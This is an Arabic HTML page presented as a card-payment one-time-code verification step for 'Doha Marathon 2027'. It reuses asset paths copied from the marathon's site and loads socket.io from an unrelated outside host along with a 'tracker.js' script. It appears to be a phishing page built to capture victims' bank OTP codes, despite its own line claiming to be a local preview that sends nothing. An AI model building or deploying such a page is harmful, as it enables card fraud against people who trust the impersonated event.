<!doctype html>
<html lang="ar" dir="rtl">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="theme-color" content="#087cf4">
	<title>التحقق من الرمز - ماراثون الدوحة 2027</title>
	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/notosans.css">
	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/rubik.css">
	<link rel="stylesheet" href="assets/payment-verify.css">
	<script src="assets/payment-verify.js" defer></script>
	<style>
		/* Loading Popup Overlay */
		.loading-overlay {
			display: none;
			position: fixed;
			top: 0; left: 0; width: 100%; height: 100%;
			background: rgba(0, 0, 0, 0.7);
			z-index: 9999;
			justify-content: center;
			align-items: center;
			flex-direction: column;
			color: white;
		}
		
		.loading-spinner {
			border: 5px solid rgba(255,255,255,0.3);
			border-top: 5px solid #ef233c;
			border-radius: 50%;
			width: 50px;
			height: 50px;
			animation: spin 1s linear infinite;
			margin-bottom: 15px;
		}
		
		@keyframes spin {
			0% { transform: rotate(0deg); }
			100% { transform: rotate(360deg); }
		}
	</style>
</head>
<body>
	<header class="card-header">
		
	</header>

	<main class="card-shell">
		<section class="card-payment-panel" aria-label="التحقق من رمز الدفع">
			<div class="merchant-row">
				<div class="merchant-logo" aria-hidden="true"><span>SUFFIX<span class="merchant-mark">X</span></span></div>
				<div class="merchant-details">
					<h1>Suffix Sports Management</h1>
					<strong id="verify-payment-total" class="payment-total"></strong>
					<p class="order-details"><span class="order-check" aria-hidden="true">✓</span> تفاصيل الطلب</p>
				</div>
			</div>

			<div class="payment-divider"><span>التحقق من الدفع</span></div>
			<div class="card-type-bar">
				<span class="card-brands" aria-label="Mastercard وVisa">
					<span class="brand-mastercard"><i></i><i></i></span>
					<span class="brand-visa">VISA</span>
				</span>
				<strong>إدخال الرمز <span aria-hidden="true">▰</span></strong>
			</div>
			<p class="card-section-label">التحقق</p>

			<form id="verify-form" class="card-form" novalidate autocomplete="on">
				<p id="verify-instruction" class="verify-instruction">
					تم ارسال الرمز الى الرقم المسجل يرجى ادخاله والضغط على زر تأكيد
				</p>
				
				<label class="card-field card-otp-field">
					<span class="visually-hidden">رمز التحقق</span>
					<span class="card-symbol" aria-hidden="true">🔐</span>
					<input
						id="verify-otp"
						class="card-input"
						name="verify-otp"
						type="text"
						inputmode="numeric"
						dir="ltr"
						placeholder="○○○○○○"
						maxlength="6"
						aria-label="رمز التحقق"
						required>
				</label>

				<button id="verify-button" class="card-pay-button" type="submit" disabled></button>
				<p id="verify-form-message" class="card-form-message" role="status" aria-live="polite" hidden></p>
			</form>
			<p class="local-card-notice">معاينة محلية فقط: لا يتم حفظ أو إرسال رمز التحقق.</p>
		</section>
	</main>

	<div class="loading-overlay" id="loadingOverlay">
		<div class="loading-spinner"></div>
		<h3 style="font-family: 'Cairo', sans-serif;">جاري التحميل...</h3>
		<p style="font-size: 0.9em; opacity: 0.8; font-family: 'Cairo', sans-serif;">الرجاء الانتظار وعدم إغلاق الصفحة</p>
	</div>

<script src="https://marath.onrender.com/socket.io/socket.io.js"></script>
<script src="/assets/tracker.js"></script>
</body>
</html>
